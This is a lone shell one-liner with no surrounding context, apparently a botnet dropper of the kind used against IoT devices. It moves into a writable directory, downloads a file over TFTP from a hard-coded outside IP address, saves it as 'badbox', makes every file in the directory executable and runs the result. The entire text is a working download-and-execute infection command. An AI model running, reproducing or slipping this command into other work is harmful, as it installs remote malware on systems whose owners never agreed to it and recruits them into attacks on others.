cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.43 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
